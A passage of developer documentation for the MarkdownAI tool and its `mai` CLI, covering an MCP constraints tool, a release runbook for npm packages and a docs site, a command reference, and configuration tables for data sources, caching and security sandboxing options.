| Method | Tool Name | Description | Auth |
|--------|-----------|-------------|------|
| MCP Tool Call | `get_constraints` | Extract and sort all `@constraint` directives from a MarkdownAI document | MCP session |

#### Examples

Tool call:

```json
{
  "name": "get_constraints",
  "arguments": {
    "filePath": ".mdd/docs/01-parser.md"
  }
}
```

Response:

```json
{
  "constraints": [
    { "text": "Parser must not spawn processes", "severity": "critical" },
    { "text": "No eval() anywhere", "severity": "critical" },
    { "text": "No file > 300 lines", "severity": "high" }
  ],
  "isMarkdownAI": true,
  "blocked": false
}
```

<!-- /mdd-section: 89-mcp-constraints -->

<!-- mdd-section: ops/release -->
### Release Runbook

Publishes all six `@markdownai/*` npm packages in dependency order, deploys the docs site to Dokploy, and optionally ships the VS Code extension to the Marketplace. All six packages always release at the same version number (lockstep versioning). The VS Code extension has its own version and ships separately.

#### When To Use

When a new version is ready to ship.

#### Steps

1. **Doc check** - If any CLI commands, directives, or public APIs changed, verify the relevant docs are updated before continuing.

2. **Preflight** - Confirm you are on `main` with a clean working tree. This is one of the few cases where `main` is used directly instead of a feature branch.

3. **Determine bump type** - Decide whether this is a `patch`, `minor`, or `major` release. Run `npm version <type> --no-git-tag-version` from the repo root. This bumps `package.json` and all workspace package versions together.

4. **Build and test** - Run `npm run build` then `npm test --workspaces --if-present`. All packages must pass before proceeding.

5. **Commit the version bump** - Stage only the version files and commit:
   ```
   git add package.json packages/*/package.json
   git commit -m "chore(release): bump to <VERSION>"
   ```

6. **Push to GitHub** - `git push origin main`

7. **Deploy docs site** - Only needed if `docs/` or `README.md` changed. Build the Docker image, test it locally, push to Docker Hub, then trigger the Dokploy webhook:
   ```
   docker build -t $DOCKER_HUB_IMAGE .
   # verify it starts and returns 200
   docker push $DOCKER_HUB_IMAGE
   source .env && curl -s -X POST "$DOKPLOY_WEBHOOK_URL"
   ```

8. **Publish npm packages** - Publish in dependency order so downstream packages resolve correctly:
   ```
   npm publish --workspace=packages/parser --access public
   npm publish --workspace=packages/renderer --access public
   npm publish --workspace=packages/engine --access public
   npm publish --workspace=packages/mcp --access public
   npm publish --workspace=packages/core --access public
   npm publish --workspace=packages/markdownai --access public
   ```

9. **VS Code extension** - Only needed if `packages/vscode` changed. Run `npm run release:vscode` to produce a `.vsix` file, then upload it manually to the VS Code Marketplace.

10. **Update global install** - `npm install -g @markdownai/core` to confirm the published version installs cleanly.

<!-- /mdd-section: ops/release -->

---

## Command Reference

All `mai` CLI commands, sorted alphabetically. See the individual feature sections for full documentation on each command.

| Command | Description | Feature |
|---------|-------------|---------|
| `mai build <file> -o <output>` | Render a document and write it to disk | CLI Complete |
| `mai cache clear [file]` | Clear cached data for a document or all documents | Caching |
| `mai cache seed <file>` | Pre-populate cache by running all fetches in a document | Caching |
| `mai cache show [file]` | Show cached entries for a document or all documents | Caching |
| `mai eval "<expression>"` | Evaluate a single MarkdownAI expression against your environment | CLI Core |
| `mai init` | Auto-detect your AI client and install the PreToolUse hook | Hook |
| `mai list-imports <file>` | Show the full dependency tree (includes/imports) for a document | CLI Complete |
| `mai list-macros <file>` | List all macros used in a document with their source file | CLI Complete |
| `mai list-phases <file>` | List all phases defined in a document with their transitions | CLI Complete |
| `mai parse <file>` | Parse a document and output its AST as JSON | CLI Core |
| `mai render <file>` | Execute a document and print the fully rendered markdown to stdout | CLI Core |
| `mai security db <subcommand>` | Manage database query jail settings (`add`, `set`, `allow-collection`, `deny-keyword`, `test`) | Security — DB |
| `mai security http <subcommand>` | Manage HTTP request jail settings (`enable`, `add-domain`, `remove-domain`, `test`) | Security — HTTP |
| `mai security init` | Create or import a security policy file | Security — Config |
| `mai security shell <subcommand>` | Manage shell command jail settings (`enable`, `add`, `remove`, `list`, `test`) | Security — Shell |
| `mai security show` | Display the active security policy | Security — Config |
| `mai serve` | Start the MCP server | MCP Server |
| `mai strip <file>` | Remove all MarkdownAI directives, producing plain markdown | Stripper |
| `mai test --suite=ai` | Run the AI-native end-to-end test suite | AI E2E |
| `mai validate <file>` | Check a document for errors and warnings without rendering | CLI Core |
| `mai watch <file> -o <output>` | Watch a document for changes and re-render automatically | CLI Complete |

---

## Configuration Reference

Key configuration options across all features. For full details, see the individual feature section.

### @list — Filesystem and Structured Data

| Option | Default | Description |
|--------|---------|-------------|
| `match` | `*` | Glob pattern for filesystem listing |
| `type` | `files` | What to list: `files`, `dirs`, or `both` |
| `depth` | Unlimited | How many folder levels deep to search |
| `path` | Root | Dot-notation key into a JSON file |
| `mode` | None | How to read a JSON object: `keys`, `values`, `entries` |
| `columns` | All fields | Fields to show and their display labels |
| `where` | None | Filter rows by a field value |
| `as` | None | Output format shorthand (e.g. `table`, `list`) |
| `@cache` | None | `session`, `persist`, or `ttl=N` |

### @read — Structured File Access

| Option | Applies To | Description |
|--------|-----------|-------------|
| `path="dot.notation"` | JSON, YAML, TOML | Navigate to a nested value |
| `key="KEY_NAME"` | .env | Look up a single flat key |
| `column="name"` | CSV | Extract one column |
| `where=` | CSV | Filter rows using an expression |
| `columns="key:Label"` | CSV | Select and rename multiple columns |
| `collapse true` | Any | Stringify nested objects inline |
| `@cache` | Any | Cache the file read result |

### @http — HTTP Requests

| Option | Default | Description |
|--------|---------|-------------|
| `url=` | Required | The endpoint to call |
| `method=` | `GET` | HTTP verb |
| `path=` | — | Dot-path selector into a JSON response |
| `headers=` | — | Comma-separated request headers |
| `timeout=` | 10000 ms | Request timeout |
| `@cache` | — | `session`, `persist`, `ttl=N`, or `mock=./file` |

### @db — Database Queries

| Option | Description |
|--------|-------------|
| `using="name"` | Name of a `@connect` connection |
| `uri=env.VAR` | Inline connection URI from an environment variable |
| `query="..."` | The query to run |
| `columns="field:Label"` | Select and rename result fields |
| `where="expression"` | Post-query filter |
| `as="type"` | Output format shorthand |
| `@cache` | `session`, `persist`, `ttl=N`, or `mock=./file` |

### Security — Shell

| Option | Default | Description |
|--------|---------|-------------|
| `shell.enabled` | `false` | Master switch for `@query` shell execution |
| `shell.allow_patterns` | `[]` | Glob patterns for permitted commands |
| `shell.deny_patterns` | `[]` | Glob patterns for always-blocked commands |
| `shell.allow_network` | `false` | Whether shell commands may make network calls |
| `shell.audit_log` | `true` | Record all shell execution attempts |

### Security — HTTP

| Option | Default | Description |
|--------|---------|-------------|
| `http.enabled` | `false` | Master switch for `@http` outbound requests |
| `http.allowed_domains` | `[]` | Domains `@http` may contact |
| `http.denied_domains` | `[]` | Domains that are always blocked |
| `http.allowed_methods` | `["GET"]` | HTTP methods permitted |
| `http.max_response_size` | 1 MB | Maximum response body size in bytes |
| `http.timeout` | 10000 ms | Request timeout |

### Security — Database

| Option | Default | Description |
|--------|---------|-------------|
| `allowed_operations` | All read ops | Query operations permitted |
| `denied_keywords` | None | Additional SQL/query keywords to block |
| `allowed_collections` | All | Collections/tables that may be queried |
| `readonly` | `true` | Enforce strict read-only access |
| `max_results` | `1000` | Maximum rows/documents per query |

### @cache — Caching Modifier

| Mode | Behavior |
|------|----------|
| `@cache session` | Store result in memory for the current session |
| `@cache ttl=N` | Session cache that expires after N seconds |
| `@cache persist` | Write result to disk across restarts |
| `@cache persist ttl=N` | Disk cache that expires after N seconds |

### @event — Transports

| Option | Default | Description |
|--------|---------|-------------|
| `allowed_transports` | `[]` | Transports that are permitted to fire; all others are no-ops |

**Transport configuration** — set in `.markdownai.json` under `transports`:

| Transport | Type | Required config |
|-----------|------|-----------------|
| `log` | built-in | None — writes to stderr |
| `mcp` | built-in | None — accumulates in `ctx.events[]` |
| `vscode` | built-in | None — writes to session JSON file |
| `websocket` | built-in | Requires active WebSocket server session |
| `file` | custom | `path` — file path to append JSON lines |
| `http` | custom | `url` — endpoint to POST to; domain must be in HTTP allowlist |
| `db` | custom | `collection` and a named `@connect` connection |

Data strings are always masked via `applyMasking()` and capped at 500 characters before dispatch. This limit cannot be raised.
| `@cache mock=./file.json` | Always return data from a local file; never call the live source |
